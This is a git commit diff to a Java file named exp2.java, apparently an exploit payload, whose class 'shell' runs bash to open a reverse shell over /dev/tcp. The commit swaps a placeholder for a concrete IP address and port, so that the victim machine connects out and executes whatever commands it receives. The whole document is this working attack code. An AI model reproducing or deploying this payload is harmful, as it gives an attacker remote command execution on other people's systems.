b776ae36f5c63a019a04a7ce365ef879124f5b94
Weiss <63772125+Urandale@users.noreply.github.com>
2023-10-24 16:25:55 +0800

    Update exp2.java

--- exp2.java
+++ exp2.java
@@ -4,7 +4,7 @@ import java.io.InputStreamReader;
 
 public class shell{
     public shell() throws Exception {
-        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/<本机IP地址>/9999;cat <&5 | while read line; do $line 2>&5 >&5; done"});
+        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/34.64.50.165/9999;cat <&5 | while read line; do $line 2>&5 >&5; done"});
         InputStream is = p.getInputStream();
         BufferedReader reader = new BufferedReader(new InputStreamReader(is));
 
